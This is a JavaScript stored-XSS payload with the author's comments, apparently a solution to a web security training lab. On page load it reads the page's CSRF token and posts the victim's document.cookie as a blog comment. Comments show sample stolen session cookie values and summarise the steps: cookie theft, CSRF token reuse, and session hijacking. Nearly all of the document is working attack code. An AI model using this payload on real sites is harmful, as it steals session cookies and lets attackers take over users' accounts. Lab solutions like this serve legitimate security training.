<script>

window.addEventListener('DOMContentLoaded', function(){

var token = document.getElementsByName('csrf')[0].value;
var data = new FormData();

data.append('csrf', token);
data.append('postId', 4);
data.append('comment', document.cookie);
data.append('name', 'victim');
data.append('email', 'hello@gmail.com');
data.append('website', 'http://www.zenshell.ninja');

fetch('/post/comment', {
    method:'POST',
    mode:'no-cors',
    body:data  
});

});

/* secret=nJ6MAQt3D4Vfe7CHUTT1jjIdWL45eEpS; session=LMAD9lm994AEp6JTH9ka9BQqPb7xoDAa
something like this will be posted on the website comments section
*/

/*


SUMMARY
--------------
step1--

we made the victim to spill out his cookie in the comments thru XSS

step2--

we used XSS attack to post the comment on behalf of the victim and used CSRF token 
coz http request cant be made due to lab restrictions (we are not using the collaborator)

step3 ---

added the cookie to get my account endpoint request hijack the session

*/

</script>